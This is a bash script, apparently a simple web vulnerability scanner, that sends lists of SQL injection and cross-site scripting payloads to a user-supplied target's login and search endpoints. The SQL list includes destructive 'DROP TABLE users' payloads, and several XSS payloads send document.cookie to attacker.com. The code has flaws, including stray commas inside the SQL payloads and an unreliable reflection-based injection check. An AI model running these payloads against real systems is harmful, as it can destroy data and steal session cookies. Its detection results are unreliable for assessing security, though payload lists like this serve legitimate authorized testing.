#!/bin/bash
# This is a comment

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Function to perform Improper Access Control detection
detect_improper_access_control() {
    echo "Detecting Improper Access Control..."
    # Send a request and analyze the response body
    response=$(curl -s -w "%{http_code}" -o temp_response.txt "$1")
    response_code=${response: -3}  # Extract last 3 characters as response code
    response_body=$(cat temp_response.txt)
    rm temp_response.txt
    
    # Check for common indicators of improper access control
    if grep -q 'admin' <<< "$response_body" || grep -q 'admin' <<< "$response_body"; then
        echo -e "${RED}Improper access control detected: Response Code: $response_code${NC}"
        echo "Response Body:"
        echo "$response_body"
    else
        echo -e "${GREEN}No improper access control detected.${NC}"
    fi
}

# Function to perform SQL Injection detection
detect_sql_injection() {
    echo "Detecting SQL Injection..."
    # Send a request with SQL Injection payloads and analyze the response
    # Example payloads: ' OR 1=1 --', '; DROP TABLE users; --', etc.
    payloads=(
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "admin'--",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1;%00",
        "' or 1=1;%23",
        "' or 1=1;%00/*",
        "' or 1=1;%23/*",
        "') or ('1'='1",
        "') or ('1'='1'--",
        "') or ('1'='1' #",
        "')) or (('1'='1",
        "')) or (('1'='1'--",
        "')) or (('1'='1' #",
        "'; DROP TABLE users; --",
        "'; DROP TABLE users; #",
        "'; DROP TABLE users; %00",
        "'; DROP TABLE users; %23",
        "'; DROP TABLE users; %00/*",
        "'; DROP TABLE users; %23/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT 'a'--",
        "' UNION SELECT 'a','a'--",
        "' UNION SELECT 'a','a','a'--",
        "' UNION SELECT 'a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--",
        "' UNION SELECT 'a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a'--"
    )
    for payload in "${payloads[@]}"; do
        response=$(curl -s -w "%{http_code}" -o temp_response.txt --data "username=admin&password=$payload" "$1/login")
        response_code=${response: -3}  # Extract last 3 characters as response code
        if [ -f "temp_response.txt" ]; then
            response_body=$(cat temp_response.txt)
            rm temp_response.txt

            # Check if the payload is reflected in the response body
            if grep -q "$payload" <<< "$response_body"; then
                echo -e "${RED}SQL Injection vulnerability detected with payload: $payload - Response Code: $response_code${NC}"
                echo "Response Body:"
                echo "$response_body"
                echo "Suggested testing: Try other SQL Injection payloads or methods to confirm and exploit the vulnerability."
                return
            fi
        fi
    done
    
    echo -e "${GREEN}No SQL Injection vulnerabilities detected.${NC}"
}


# Function to perform Cross-Site Scripting (XSS) detection
detect_xss() {
    echo "Detecting Cross-Site Scripting (XSS)..."
    # Send a request with XSS payloads and analyze the response
    payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg/onload=alert('XSS')>"
        "<body/onload=alert('XSS')>"
        "<iframe/onload=alert('XSS')>"
        "<a href='javascript:alert(`XSS`)'>Click me</a>"
        "<svg><script>alert('XSS')</script></svg>"
        "<img src=x onerror=prompt(document.cookie)>"
        "<img src=x onerror=confirm('XSS')>"
        "<img src=x onerror=eval('alert(`XSS`)')>"
        "<img src=x onerror=eval(atob('YWxlcnQoJ0h5cGVybGVkZGR5Jyk='))>"
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"
        "<svg/onload=fetch(`//attacker.com/log?cookie=${document.cookie}`)>"
        "<img src=x onerror=document.write('<script src=\"//attacker.com/xss.js\"></script>')>"
        "<svg/onload=location.href='//attacker.com/log?cookie='+document.cookie>"
        "<iframe/onload=top.location.href='//attacker.com/log?cookie='+document.cookie>"
        "<script>document.write('<img src=\"//attacker.com/log?cookie='+document.cookie+'\">')</script>"
        "<script>document.write('<img src=\"//attacker.com/log?cookie='+escape(document.cookie)+'\">')</script>"
        "<svg/onload=setInterval(()=>fetch(`//attacker.com/log?cookie=${document.cookie}`),1000)>"
        "<iframe/srcdoc='<script>alert(`XSS`)</script>'>"
        "<style>@import url(\"javascript:alert('XSS');\")</style>"
        "<svg/onload=prompt('XSS')>"
        "<svg/onload=confirm('XSS')>"
        "<svg/onload=eval('alert(`XSS`)')>"
        "<svg/onload=eval(atob('YWxlcnQoJ0h5cGVybGVkZGR5Jyk='))>"
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"
        "<iframe/srcdoc='<script>alert(`XSS`)</script>'>"
        "<iframe/srcdoc='<svg/onload=alert(`XSS`)>"
        "<a href='javascript:eval(`alert(\"XSS\")`)'>Click me</a>"
        "<a href='javascript:void(0)' onmouseover=alert('XSS')>Click me</a>"
        "<img src=x onerror=eval(`alert(\"XSS\")`)>"
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)))>"
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)))>"
        "<iframe/srcdoc='<svg/onload=eval(`alert(\"XSS\")`)'>>"
        "<script>setTimeout(\"alert('XSS')\",5000)</script>"
        "<svg/onload='new Function(`alert(\"XSS\")`)()'>"
        "<svg/onload='setTimeout(`alert(\"XSS\")`,5000)'>"
        "<a href='jAvAsCrIpT:alert(`XSS`)'>Click me</a>"
        "<a href='#' onclick='eval(`alert(\"XSS\")`)'>Click me</a>"
        "<a href='#' onmouseover='eval(`alert(\"XSS\")`)'>Click me</a>"
        "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K'>Click me</a>"
        "<img src=x onerror='eval(`confirm(\"XSS\")`)'>>"
        "<img src=x onerror='eval(`eval(atob(\"YWxlcnQoJ0h5cGVybGVkZGR5Jyk=\"))`)'>>"
        "<img src=x onerror='eval(`eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))`)'>>"
        "<img src=x onerror='eval(`fetch(`//attacker.com/log?cookie=${document.cookie}`)`)'>"
        "<img src=x onerror='eval(`document.write(`\\x3Cscript>alert(\"XSS\")\\x3C/script>`)`)'>>"
    )
    for payload in "${payloads[@]}"; do
        response=$(curl -s -w "%{http_code}" -o temp_response.txt --data-urlencode "search=$payload" "$1/search")
        response_code=${response: -3}  # Extract last 3 characters as response code
        response_body=$(cat temp_response.txt)
        rm temp_response.txt
        
        # Check if the payload is reflected in the response body
        if grep -q "$payload" <<< "$response_body"; then
            echo -e "${RED}Cross-Site Scripting (XSS) vulnerability detected with payload: $payload - Response Code: $response_code${NC}"
            echo "Response Body:"
            echo "$response_body"
            echo "Suggested testing: Try other XSS payloads or methods to confirm and exploit the vulnerability."
            return
        fi
    done
    
    echo -e "${GREEN}No Cross-Site Scripting (XSS) vulnerabilities detected.${NC}"
}



# Main function
main() {
    echo -e "${GREEN}Vulnerability Detection Tool${NC}"
    echo "--------------------------------------"

    # Prompt user for target URL
    read -p "Enter your target URL: " target_url
    echo "Analyzing target: $target_url"
    
    # Perform vulnerability detection
    detect_improper_access_control "$target_url"
    detect_sql_injection "$target_url"
    detect_xss "$target_url"
}

# Call main function
main
